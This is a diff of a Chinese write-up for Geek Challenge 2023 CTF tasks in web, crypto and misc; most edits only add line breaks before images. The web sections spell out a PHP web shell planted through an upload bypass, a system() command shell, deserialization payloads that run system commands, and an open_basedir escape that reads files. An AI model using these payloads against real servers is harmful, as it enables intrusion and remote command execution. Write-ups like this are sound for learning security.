@@ -30,23 +30,23 @@
 打开网址，提示post传参
 <br>![Alt text](image.png)<br>
 右键查看源代码发现注释
-![Alt text](image-1.png)<br>
+<br>![Alt text](image-1.png)<br>
 打开`robots.txt`文件
-![Alt text](image-2.png)<br>
+<br>![Alt text](image-2.png)<br>
 说`/o2takuXX's_username_and_password.txt`这个文件不让爬，打开看一下，得到账号密码
-![Alt text](image-3.png)<br>
+<br>![Alt text](image-3.png)<br>
 传入参数`username=admin&password=@dm1N123456r00t#`
-![Alt text](image-4.png)<br>
+<br>![Alt text](image-4.png)<br>
 设置referer字段为`syssec.com`
-![Alt text](image-5.png)<br>
+<br>![Alt text](image-5.png)<br>
 修改UA头部的内容为`Syclover`
-![Alt text](image-6.png)<br>
+<br>![Alt text](image-6.png)<br>
 提示要从本地访问，修改rff字段为`127.0.0.1`
-![Alt text](image-7.png)<br>
+<br>![Alt text](image-7.png)<br>
 需要设置代理，修改Via字段为`Syc.vip`
-![Alt text](image-8.png)<br>
+<br>![Alt text](image-8.png)<br>
 最后一步了，从php代码看需要从http头部获取`O2TAKUXX`字段的值并比较，直接添加这个字段并且值设置为
-![Alt text](image-9.png)<br>
+<br>![Alt text](image-9.png)<br>
 获得flag：`SYC{HttP_1s_E@sY}`
 
 ps. 做到浏览器那一步想起来以前做过，查了一下是19年极客大挑战，什么祖传题目。
@@ -54,7 +54,7 @@ ps2. 你这个三叶草浏览器能有黑曜石浏览器一半功能吗。
 
 ## easy_php
 非常好套娃，使我的大脑旋转
-![Alt text](image-10.png)<br>
+<br>![Alt text](image-10.png)<br>
 代码非常清晰明了，套娃绕过，全部通过即可，首先看第一部分
 `isset($_GET['syc'])&&preg_match('/^Welcome to GEEK 2023!$/i', $_GET['syc']) && $_GET['syc'] !== 'Welcome to GEEK 2023!'`
 要求从GET请求中获得syc的值，并且过一个正则比较和一个非严格不等，正则比较和不等比较的字符串部分是一样的，但是正则表达式部分大小写不敏感，所以设置payload为`?syc=welcome to GEEK 2023!`完成第一部分绕过。<br>
@@ -67,28 +67,28 @@ ps2. 你这个三叶草浏览器能有黑曜石浏览器一半功能吗。
 `isset($_POST['SYC_GEEK.2023'])&&($_POST['SYC_GEEK.2023']="Happy to see you!")`
 从post获取参数`SYC_GEEK.2023`并且指定了值，这一步的难点在于直接传入`SYC_GEEK.2023`会被php保存为`SYC_GEEK_2023`，`.`被看做非法字符重命名为`_`。不过这个重命名有个问题是只会修改第一种碰到的非法字符，因此只需要把参数名种的`_`修改为另一种非法字符就可以了。传入的body为`qw=ab&yxx=ab&SYC[GEEK.2023=Happy to see you!`，得到flag
 
-![Alt text](image-11.png)<br>
+<br>![Alt text](image-11.png)<br>
 
 
 ## n00b_Upload
 打开网址
-![Alt text](image-12.png)<br>
+<br>![Alt text](image-12.png)<br>
 嗯，有他妈柚子厨，看一下出题人
-![Alt text](image-13.png)<br>
+<br>![Alt text](image-13.png)<br>
 首先试着上传一张正常的图片，返回如图
-![Alt text](image-14.png)<br>
+<br>![Alt text](image-14.png)<br>
 啊？我马呢？我那么大一个马呢？哦，我还没传马啊，那没事了。
 出题人很贴心地给了非常多的返回信息，从返回信息看有一个后缀检查，一个文件头检查和一个内容检查。
 首先看后缀检查，试一下上传正常图片，但是抓包后修改文件后缀
-![Alt text](image-15.png)<br>
+<br>![Alt text](image-15.png)<br>
 不仅过了后缀还过了头部，保存文件存储的后缀还是php，那么只要能通过文件内容检查就可以直接连接这个马。
 试着往文件中添加一句话木马，`<?php @eval($_POST[value]);?>`
-![Alt text](image-16.png)<br>
+<br>![Alt text](image-16.png)<br>
 检测到了木马并且让我去玩原神。
 再尝试一下，只添加`<?php?>`不添加任何代码，结果还是一样。那么至少会有个针对php标识的检测，继续尝试不同组合（`<?>` `<?` `?>` `<>` `<?php` `<?ph` `<?PhP` ）后发现，这一部分只检测了php的代码标识头，查阅资料后发现可以使用`<?= ?>`来代替`<?php ?>`，测试也能正常上传。
 那么接下来只需要制作一个图片马就可以完成了，由于有些图片以php解析的时候可能会被错误地执行php代码，所以直接建立一个空jpg文件，用16进制编辑器加个jpg的头，然后添加一句话木马`<?= @eval($_POST[value]);?>`，上传成功后使用蚁剑连接，在根目录下找到flag。
-![Alt text](image-18.png)<br>
-![Alt text](image-17.png)<br>
+<br>![Alt text](image-18.png)<br>
+<br>![Alt text](image-17.png)<br>
 
 ps. 在做的时候用蚁剑连不上，后来换了一个马`<?= system($_GET['cmd']);
 ?>`在网页里面一点点找到了。
@@ -196,7 +196,7 @@ if (isset($_GET['var']) && $_GET['var']) {
 ```
 提示给的很足，一个是当前目录下有东西，一个是正则表达式（匹配无传参的函数，可以嵌套匹配）和题目名字直说是无参数RCE了，然后看第二层判断，不能使用包含env。var。session。header这些的函数。
 首先构造payload查看当前目录下文件：`print_r(scandir(getcwd()));`
-![Alt text](image-48.png)<br>
+<br>![Alt text](image-48.png)<br>
 可以看到有个fl@g.php，就是它了，直接访问得到flag。
 
 
@@ -226,13 +226,13 @@ if(isset($_GET['web'])){
 乍一看这个类可以执行任意函数，是可以秒杀的题目，但其实这道题设置了好几个卡，首先是正则表达式检查`lover`，这一步可以使用16进制替换ascii来绕过，具体来说就是把序列化字符串中的`lover`替换为`love\72`，并且把代表字符串的`s`替换为大写。那么就可以得到一个payload:`O:3:"syc":1:{S:5:"love\72";s:13:"system("ls");";}`，但是得不到文件列表。
 接着看发现是在反序列化函数后直接抛出错误，导致反序列化的对象无法正常删除，也就无法执行析构函数，这里搜索了之后可以使用提前销毁对象的方法来解决，简单来说就是把指向对象的变量重新指向NULL，那么原先的对象就没有变量指向它，会自动触发销毁。具体的做法就是反序列化一个列表，第一个元素是对象，第二个元素是NULL，序列化后把第二个元素的`i:1`修改为`i:0`，这样在反序列化的过程中就会重新指向，进而触发析构函数，payload为：`a:2:{i:0;O:3:"syc":1:{S:5:"love\72";s:13:"system("ls");";}i:0;N;}`
 运行后发现system被禁用，修改payload使用phpinfo查看
-![Alt text](image-49.png)<br>
+<br>![Alt text](image-49.png)<br>
 禁用了很多常用函数，再查看`open_basedi`项，也被限制了
-![Alt text](image-51.png)<br>
+<br>![Alt text](image-51.png)<br>
 要绕过这两个限制是有点麻烦的，这里参考了[这篇博客](https://blog.csdn.net/snowlyzz/article/details/126310439)
 根据之前做题目的经验，网上走四层就能到根目录了，简单修改一下令`$lover='mkdir("a");chdir("a");ini_set("open_basedir","..");chdir("..");chdir("..");chdir("..");chdir("..");ini_set("open_basedir","/");print_r(scandir("."));'`，重新生成反序列化字符串，并且按照上面修改一下得到payload：`a:2:{i:0;O:3:"syc":1:{S:5:"love\72";s:149:"mkdir("a");chdir("a");ini_set("open_basedir","..");chdir("..");chdir("..");chdir("..");chdir("..");ini_set("open_basedir","/");print_r(scandir("."));";}i:0;N;}`
 可以看到有个目录叫`f1ger`很可疑
-![Alt text](image-52.png)<br>
+<br>![Alt text](image-52.png)<br>
 不知道是目录还是文件，试试看直接读取，payload:`a:2:{i:0;O:3:"syc":1:{S:5:"love\72";s:146:"mkdir("a");chdir("a");ini_set("open_basedir","..");chdir("..");chdir("..");chdir("..");chdir("..");ini_set("open_basedir","/");readfile("/f1ger");";}i:0;N;}`
 获得flag。
 
@@ -282,20 +282,20 @@ for i in range(100,200):
 
 ```
 由于cmd`ctrl+a`能一次性选择的长度有限，选择每100个数字运行一次，运行完脚本后复制到word文档，然后打开查找`SYC{`，如果结果为100个就继续爆破，结果为101说明找到了幸运数字。在第二次运行得到结果，数字是142，flag是：```SYC{C0ngratulati0nnnns_You_gAessEd_R1ght}```
-![Alt text](image-47.png)<br>
+<br>![Alt text](image-47.png)<br>
 
 
 # crypto
 
 ## SignIn
 看看签到题
-![Alt text](image-32.png)<br>
+<br>![Alt text](image-32.png)<br>
 一眼盯真，一看就是十六进制ascii，直接解码就行
 得到flag:`SYC{Hello_World_Crypto_bibobibo}`
 
 ## proof_of_work
 nc连上机器
-![Alt text](image-33.png)<br>
+<br>![Alt text](image-33.png)<br>
 很明显是让我们填入四个字符使得等式成立，就是一道爆破题目，写脚本如下
 ```python
 import hashlib
@@ -325,7 +325,7 @@ for i1 in range(32,127):
                     print(chr(i1)+chr(i2)+chr(i3)+chr(i4))
 ```
 运行脚本得到四位字符
-![Alt text](image-34.png)<br>
+<br>![Alt text](image-34.png)<br>
 填入得到flag:`SYC{st3p_1nt0_1nter4ctive_Crypt0graphy}`
 
 ## easy_classic
@@ -334,23 +334,23 @@ for i1 in range(32,127):
 我还以为要用rot，被骗了。
 题目是个逆天五层套娃，全是古典密码，一层层看吧
 第一层：
-![Alt text](image-35.png)<br>
+<br>![Alt text](image-35.png)<br>
 全是字母，基本上是代还密码，全试一遍，发现是凯撒
 key是16，密码是`enjoythegame
 第二层：`
-![Alt text](image-36.png)<br>
+<br>![Alt text](image-36.png)<br>
 最后这几个字母很容易看到是crypto的乱序啊，而且cry都在最后面，估计就是栅栏了，试了一下得到是7栏的W栅栏，密码是`ilovecryptohaha`
 第三层：
-![Alt text](image-37.png)<br>
+<br>![Alt text](image-37.png)<br>
 
 大小写字母加数字，看不太出来，试了一遍发现居然是base64，得到密码`宇宙万法的那个源头`
 > ps. 看到这个密码我还去搜了，以为是如如/如来，最后发现就是这个
 
 第四层：
-![Alt text](image-38.png)<br>
+<br>![Alt text](image-38.png)<br>
 特征明显，和佛曰那些差不多，直接搜熊曰编码，解密得到密码`never gonna give you up`
 第五层：
-![Alt text](image-39.png)<br>
+<br>![Alt text](image-39.png)<br>
 key部分很明显是个emoji加密，又叫base100，解密得到key:`fairgame`
 然后把所有我知道的带key的古典密码全部试了一遍，死活解密不了，最后没办法上搜索引擎搜，看了三四篇古典密码的ctf大集合，终于找到了这种加密方法叫palyfair密码，解密得到密码原神启动，啊不是，是`genshinstart`
 得到flag:`SYC{classical_1s_fun}`
@@ -691,43 +691,43 @@ print(long_to_bytes(m))
 
 ## cheekin
 看看签到题，进公众号发flag返回一张图片
-![Alt text](IMG_0160-1.png)<br>
+<br>![Alt text](IMG_0160-1.png)<br>
 
 仔细观察图片上没有什么隐藏的信息，那大概就是图片隐写了，打开祖传工具Stegsolve，查看file format未见异常，那就看看是不是lsb，出来了
-![Alt text](image-19.png)<br>
+<br>![Alt text](image-19.png)<br>
 获得flag: `syc{s4y_he110_t0_syclover}`
 
 ## Qingwan心都要碎了
 从题目描述和附件看是个社工题。
-![Alt text](image-20.png)<br>
+<br>![Alt text](image-20.png)<br>
 观察左边图片能看到一个模糊的重庆城市沙盒，定位地点是在重庆
-![Alt text](image-21.png)<br>
+<br>![Alt text](image-21.png)<br>
 右边有很多历史文件，其中有个叫做三峡工程淹没区人口户X簿
-![Alt text](image-22.png)<br>
+<br>![Alt text](image-22.png)<br>
 以重庆，三峡，博物馆为关键词搜索
-![Alt text](image-23.png)<br>
+<br>![Alt text](image-23.png)<br>
 得到flag:`SYC{重庆中国三峡博物馆}`
 
 ## 下一站是哪儿呢
 还是个系列题，也是社工
-![Alt text](image-29.png)<br>
+<br>![Alt text](image-29.png)<br>
 打开附件给了一个聊天记录
-![Alt text](talk.jpg)
+<br>![Alt text](talk.jpg)
 先看机场图片
-![Alt text](airport.png)<br>
+<br>![Alt text](airport.png)<br>
 机场大厅有个钢琴，这特征还挺明显的，以此搜索，基本都是国外的机场，感觉不是很符合，直接上以图搜图吧
-![Alt text](image-24.png)<br>
+<br>![Alt text](image-24.png)<br>
 深圳宝安国际机场，不太确定，以深圳宝安国际机场和钢琴为关键词搜索，找到几个视频
-![Alt text](image-25.png)<br>
+<br>![Alt text](image-25.png)<br>
 应该就是这里了，出发地已经确定，看目的地，专门给了一张图，应该还是图片隐写，但是祖传工具Stegsolve没有得到信息，那就看看是不是图种，打开kali使用binwalk
-![Alt text](image-26.png)<br>
+<br>![Alt text](image-26.png)<br>
 确实是，那就用foremost分解一下，分离出来一个zip文件，打开是一个txt和一张图片。
-![Alt text](image-27.png)<br>
-![Alt text](image-28.png)<br>
+<br>![Alt text](image-27.png)<br>
+<br>![Alt text](image-28.png)<br>
 游戏？题目描述里说了是指挥官基恩，再结合这个图，应该就是这个游戏里的一种文字。搜索一下
-![Alt text](image-30.png)<br>
+<br>![Alt text](image-30.png)<br>
 再搜索标准银河字母，得到对照表
-![Alt text](image-31.png)<br>
+<br>![Alt text](image-31.png)<br>
 对照解密为“i want to go to liquor city”，搜索shenzhen-liquor airlines，没有结果，再搜下liquor city，也不是一个城市。
 但是给翻译软件过了一下，“我想要去酒城”，搜索中国酒城，得到目的地泸州。
 已知是深圳-泸州，起飞时间大概在晚上八点半之后，打开旅游软件买机票搜索一下，得到航班号CZ8579
@@ -738,9 +738,9 @@ print(long_to_bytes(m))
 首先下载附件，给的是一个压缩包，binwalk一下没有隐藏文件。
 解压是一张图片，foremost分离失败，linux下可以打开，不是图种和宽高修改。
 打开图片发现有一些奇怪的白点组成的字符
-![Alt text](image-41.png)<br>
+<br>![Alt text](image-41.png)<br>
 使用画图工具放大拉倒最满，查看
-![Alt text](image-42.png)<br>
+<br>![Alt text](image-42.png)<br>
 发现格点排列很整齐，起始像素是5,5，之后每10个像素打一个点，写一段脚本把这写点提取出来
 ```python
 from PIL import Image
@@ -778,12 +778,12 @@ new_image.save("extracted_image.png")
 original_image.close()
 ```
 用画图打开反色一下
-![Alt text](image-43.png)<br>
+<br>![Alt text](image-43.png)<br>
 出现了很多很抽象的字符，这里需要把图像转换成字符串，但是直接肉眼猜对应的字母会出现很怪的错误，所以搜了一下死亡笔记的艺术字，发现这是一种字体，可以打开一些字体网之找到对照图，叫`Old English Text MT`
-![Alt text](image-46.png)<br>
+<br>![Alt text](image-46.png)<br>
 这是对照图，一个一个对照下来得到字符串`TkFNRV9vMnRha3VYWH0=`，base64一下得到后半段flag:`NAME_o2takuXX}`
 然后打开祖传工具Stegsolve，先看看file format，发现最下面有一段base64
-![Alt text](image-44.png)<br>
+<br>![Alt text](image-44.png)<br>
 解码得到
 > "你找到了一本《DEATH NOTE》，好奇心驱使你翻开这本笔记，你阅读了使用规则，但是你惊讶地发现刚才的规则之中唯独没有第10条..."
 "你再次去确认是否如此，笔记上的文字却仿佛活了起来，在你眼中不断地放大缩小，你闭上了双眼..."
@@ -791,7 +791,7 @@ original_image.close()
 
 好嘛，这是提示刚刚完成的部分，不管他。
 再打开lsb隐写，又有一段base64，第一眼还以为和刚刚找到的是一样的，仔细看才发现不是。
-![Alt text](image-45.png)<br>
+<br>![Alt text](image-45.png)<br>
 取出来之后解码得到
 >"你继续观察手上漆黑色的笔记本，冷静下来的你发现了藏在封面最下边的一行小字:SYC{D4@Th_N0t4_"
 "你浏览过整个笔记本，可惜全是空白页，其中有一页不知道被谁撕掉了，你最终还是翻到了缺失的那一骆Ԉ(RNSڋ*瞶B;v⃦׾3⫦vOO랺Òꛦ_Ǟj^W丸
@@ -804,9 +804,9 @@ ps. 规则第十条是 *接触到死亡笔记的人，即便不是死亡笔记�
 ## xqr
 下载附件，是一个压缩包，里面有图片，直接foremost压缩包，没有隐藏文件，再foremost解压出来的图片，隐藏了一个图片。
 得到的两个图片长这样
-![Alt text](image-53.png)<br>
+<br>![Alt text](image-53.png)<br>
 第一个扫码出来说自己不是flag，第二个大小只有25x25，很糊，一开始看缺了四块，以为是补充四个定位点就好，但实际上做不出来，又想手动补全，但还是读取不了，最后放弃了。
 过了一段时间官方发了个hint
-![Alt text](image-54.png)<br>
+<br>![Alt text](image-54.png)<br>
 无语，把第二个二维码用画图工具放大三倍到和第一个二维码一样大，然后用祖传工具combine一下，得到一个新的二维码图片，扫码获得flag。
 `SYC{hOp3_u_h@ve_Fun}`
